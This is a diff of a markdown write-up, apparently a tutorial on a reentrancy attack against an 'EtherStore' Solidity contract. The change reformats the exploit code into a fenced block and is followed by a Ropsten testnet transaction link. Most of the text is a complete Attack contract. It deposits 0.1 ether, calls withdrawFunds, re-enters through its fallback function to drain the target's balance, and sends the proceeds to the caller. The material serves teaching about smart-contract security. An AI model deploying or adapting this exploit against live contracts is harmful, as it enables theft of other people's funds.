@@ -36,44 +36,39 @@ To \(contract\):
 
 #### Attack.sol
 
+```javascript
 pragma solidity 0.4.18;
 
 contract EtherStore {
-
-        function depositFunds\(\) public payable {}
-
-        function withdrawFunds\(uint256\) public {}
-
-    }
-
-contract Attack {  
-    //EtherStore public etherStore;  
-    EtherStore public etherStore;
-
-        function Attack\(address \_t\) public {  
-        etherStore = EtherStore\(\_t\);  
-    }
-
-  function attackEtherStore\(\) public payable {  
-      // attack to the nearest ether  
-      require\(msg.value &gt;= 0.1 ether\);  
-      // send eth to the depositFunds\(\) function  
-      etherStore.depositFunds.value\(0.1 ether\)\(\);  
-      // start the magic  
-      etherStore.withdrawFunds\(0.1 ether\);  
-  }
-
-  function collectEther\(\) public {  
-      msg.sender.transfer\(this.balance\);  
-  }
-
-  // fallback function - where the magic happens  
-  function \(\) payable {  
-      if \(etherStore.balance &gt; 0.1 ether\) {  
-          etherStore.withdrawFunds\(0.1 ether\);  
-      }  
-  }  
+        function depositFunds() public payable {}
+        function withdrawFunds(uint256) public {}
 }
+
+contract Attack {
+    //EtherStore public etherStore;
+    EtherStore public etherStore;
+        function Attack(address _t) public {
+        etherStore = EtherStore(_t);
+    }
+  function attackEtherStore() public payable {
+      // attack to the nearest ether
+      require(msg.value >= 0.1 ether);
+      // send eth to the depositFunds() function
+      etherStore.depositFunds.value(0.1 ether)();
+      // start the magic
+      etherStore.withdrawFunds(0.1 ether);
+  }
+  function collectEther() public {
+      msg.sender.transfer(this.balance);
+  }
+  // fallback function - where the magic happens
+  function () payable {
+      if (etherStore.balance > 0.1 ether) {
+          etherStore.withdrawFunds(0.1 ether);
+      }
+  }
+}
+```
 
 [https://ropsten.etherscan.io/tx/0x551f6d272274edbef299763343a4daea58438ef20522ed526ecfea7bff59734f](https://ropsten.etherscan.io/tx/0x551f6d272274edbef299763343a4daea58438ef20522ed526ecfea7bff59734f)  
 From:  
